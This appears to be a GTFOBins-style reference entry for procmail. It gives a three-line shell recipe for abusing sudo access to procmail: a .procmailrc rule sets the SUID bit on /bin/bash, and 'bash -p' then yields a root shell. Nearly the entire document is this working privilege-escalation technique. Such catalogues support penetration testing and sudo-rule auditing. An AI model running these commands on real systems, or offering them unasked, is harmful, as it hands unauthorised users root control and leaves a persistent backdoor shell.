---
description: |
    Procmail is an email server software component.
functions:
  sudo:
   - description: By modifying/creating a procmailrc configuration file, we can specify a processing rule for any command we want.
     code: |
        echo -e ':0\n| chmod u+s /bin/bash' > .procmailrc
        echo "gtfobins" | sudo procmail -m .procmailrc
        bash -p
---
